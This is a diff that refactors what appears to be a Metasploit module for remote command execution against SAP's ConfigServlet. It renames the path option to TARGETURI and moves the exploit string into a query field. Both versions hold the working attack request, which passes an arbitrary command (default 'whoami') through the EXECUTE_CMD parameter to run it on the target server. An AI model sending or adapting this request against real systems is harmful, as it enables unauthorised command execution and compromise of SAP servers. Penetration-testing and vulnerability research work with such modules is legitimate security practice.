@@ -28,7 +28,7 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				Opt::RPORT(50000),
 				OptString.new('CMD', [ true, 'The command to execute', 'whoami']),
-				OptString.new('PATH', [ true, 'Path to ConfigServlet ', '/ctc/servlet/ConfigServlet']),
+				OptString.new('TARGETURI', [ true, 'Path to ConfigServlet', '/ctc/servlet']),
 				OptBool.new('SSL', [true, 'Use SSL', false])
 			], self.class)
 	end
@@ -36,10 +36,13 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		begin
 			print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])
+			uri = normalize_uri(target_uri.path, 'ConfigServlet')
+			
 			res = send_request_cgi(
 				{
-					'uri'    => datastore['PATH'] + '?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=' + Rex::Text.uri_encode(datastore['CMD']),
-					'method' => 'GET'
+					'uri' => uri,
+					'method' => 'GET',
+					'query' => 'param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=' + Rex::Text::uri_encode(datastore['CMD'])
 				})
 			if !res or res.code != 200
 				print_error("#{rhost}:#{rport} - Exploit failed.")
